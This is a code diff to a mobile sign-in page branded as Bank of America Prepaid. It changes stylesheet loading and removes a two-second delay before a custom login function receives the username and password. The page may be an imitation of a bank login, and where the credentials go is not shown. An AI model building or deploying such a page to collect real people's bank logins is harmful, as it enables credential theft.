@@ -2,11 +2,13 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <title>Bank of America Prepaid - Sign In</title>
     <link rel="icon" href="/logo.svg" type="image/svg+xml">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
     <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" media="print" onload="this.media='all'">
+    <noscript><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"></noscript>
 </head>
 <body>
     <div class="mobile-container">
@@ -154,7 +156,7 @@
             const passwordInput = document.getElementById('password').value;
             const rememberMe = document.getElementById('remember-me').checked;
 
-            setTimeout(async () => {
+            (async function () {
                 try {
                     const result = await BoAConfig.login(usernameInput, passwordInput);
                     if (result.success) {
@@ -175,7 +177,7 @@
                     loginBtn.disabled = false;
                     showModal('Unable to sign in right now. Please try again shortly.');
                 }
-            }, 2000);
+            })();
         });
     </script>
 </body>
